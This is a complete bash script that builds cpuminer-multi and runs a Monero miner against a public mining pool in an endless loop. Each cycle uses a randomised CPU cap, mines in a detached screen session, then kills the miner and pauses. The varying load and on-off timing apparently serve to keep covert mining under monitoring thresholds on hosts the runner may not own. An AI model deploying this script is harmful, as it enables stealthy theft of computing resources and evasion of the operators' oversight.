#!/bin/bash
sudo apt-get update
sudo apt-get install git make automake screen libcurl4-openssl-dev -y
sudo apt-get install libcurl4-openssl-dev build-essential libjansson-dev -y
git clone https://github.com/wolf9466/cpuminer-multi
cd cpuminer-multi
./autogen.sh
CFLAGS="-march=native" ./configure
make

NPROC=$(nproc)
num1=`expr $NPROC \* 34`
num2=`expr $NPROC \* 84`
while [ 2 -ge 0 ] 
do
cpult=$(shuf -i $num1-$num2 -n 1)
delay1=$(shuf -i 900-1800 -n 1)
delay2=$(shuf -i 10-20 -n 1)
cpulimit --exe minerd --limit $cpult -b
screen -S foo -d -m ./minerd -a cryptonight -o stratum+tcp://xmr-eu.suprnova.cc:5222 -u vant.1 -p 1
sleep $delay1
screen -S foo -X kill
pkill -f cpulimit
sleep $delay2
done
